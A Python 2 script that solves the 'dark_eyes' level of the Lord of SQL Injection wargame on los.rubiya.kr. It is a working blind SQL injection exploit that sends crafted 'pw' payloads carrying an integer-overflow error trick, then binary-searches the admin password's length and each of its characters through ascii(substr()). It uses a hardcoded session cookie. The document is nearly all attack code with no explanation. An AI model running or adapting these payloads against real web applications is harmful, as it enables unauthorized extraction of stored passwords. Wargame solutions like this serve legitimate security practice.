#!/usr/bin/env python

import urllib
import urllib2
import sys

URL = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
Cookie = "PHPSESSID=o4js9lcvfjuu3tts6juitjlido"


def query(Q):
    # print urllib.quote(Q)
    UURL = URL + "?pw=" + urllib.quote(Q)
    req = urllib2.Request(UURL, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })

    res = urllib2.urlopen(req)
    text = res.read()
    if "location.href" in text:
        print "Session expired..."
        sys.exit()
        
    return not "<hr>" in text

def find_length():
    left = 0
    right = 200 # (left, right]
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query("' or id='admin' and (length(pw)>{})*0xffffffffffffffff*0xffffffffffffffff-- ".format(mid)):
            left = mid+1
        else:
            right = mid
    return right

def find_ch(pos):
    print "Finding pos {} th character".format(pos)
    left = 0
    right = (1<<8)
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query("' or id='admin' and (ascii(substr(pw,{},1))>{})*0xffffffffffffffff*0xffffffffffffffff-- ".format(pos, mid)):
            left = mid+1
        else:
            right = mid
    print "COOL!! {} = {}".format(pos, right)
    return right

LENGTH = find_length()
print "LENGTH = {}".format(LENGTH)
PASSWORD = ""
for i in range(1, LENGTH+1):
    PASSWORD += chr(find_ch(i))
    print PASSWORD

print PASSWORD

query(PASSWORD)
